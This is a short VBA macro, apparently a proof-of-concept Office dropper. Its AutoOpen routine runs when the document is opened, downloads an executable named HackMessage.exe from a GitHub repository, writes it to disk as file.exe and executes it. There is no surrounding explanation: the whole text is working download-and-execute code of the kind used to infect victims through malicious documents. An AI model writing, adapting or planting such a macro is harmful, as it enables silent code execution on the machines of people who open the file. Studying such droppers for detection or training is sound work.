Sub AutoOpen()

Dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.3.0")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://github.com/NotSurprised/MacroDownloader/raw/master/HackMessage.exe", False
xHttp.Send

With bStrm
 .Type = 1 '//binary
 .Open
 .write xHttp.responseBody
 .savetofile "file.exe", 2 '//overwrite
End With

Shell ("file.exe")

End Sub